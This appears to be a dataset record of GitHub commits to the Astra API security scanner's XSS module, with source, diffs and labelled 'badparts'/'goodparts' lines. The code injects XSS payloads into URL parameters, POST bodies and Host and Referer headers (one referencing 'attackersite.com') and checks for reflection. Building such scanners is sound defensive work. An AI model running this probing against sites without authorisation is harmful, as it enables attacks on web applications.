+'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ", "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post.body)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)"}}, "msg": "Minor changes in xss_post_method function"}, "9d52656d839d6a97eeca12578ca127318a367e00": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/9d52656d839d6a97eeca12578ca127318a367e00", "html_url": "https://github.com/flipkart-incubator/Astra/commit/9d52656d839d6a97eeca12578ca127318a367e00", "sha": "9d52656d839d6a97eeca12578ca127318a367e00", "keyword": "XSS change", "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 0ca843a..eafd147 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -101,7 +101,7 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n \n     # Test for Referer based XSS \n     for payload in xss_payloads:\n-        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header_value = 'https://github.com?test='+payload\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n", "message": "", "files": {"/modules/xss.py": {"changes": [{"diff": "\n \n     # Test for Referer based XSS \n     for payload in xss_payloads:\n-        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header_value = 'https://github.com?test='+payload\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n", "add": 1, "remove": 1, "filename": "/modules/xss.py", "badparts": ["        referer_header_value = 'http://attackersite.com?test='+payload"], "goodparts": ["        referer_header_value = 'https://github.com?test='+payload"]}], "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ", "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)"}}, "msg": "Minor changes in xss_post_method function"}, "5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c", "html_url": "https://github.com/flipkart-incubator/Astra/commit/5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c", "sha": "5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c", "keyword": "XSS change", "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 0ca843a..eafd147 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -101,7 +101,7 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n \n     # Test for Referer based XSS \n     for payload in xss_payloads:\n-        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header_value = 'https://github.com?test='+payload\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n", "message": "", "files": {"/modules/xss.py": {"changes": [{"diff": "\n \n     # Test for Referer based XSS \n     for payload in xss_payloads:\n-        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header_value = 'https://github.com?test='+payload\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n", "add": 1, "remove": 1, "filename": "/modules/xss.py", "badparts": ["        referer_header_value = 'http://attackersite.com?test='+payload"], "goodparts": ["        referer_header_value = 'https://github.com?test='+payload"]}], "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) 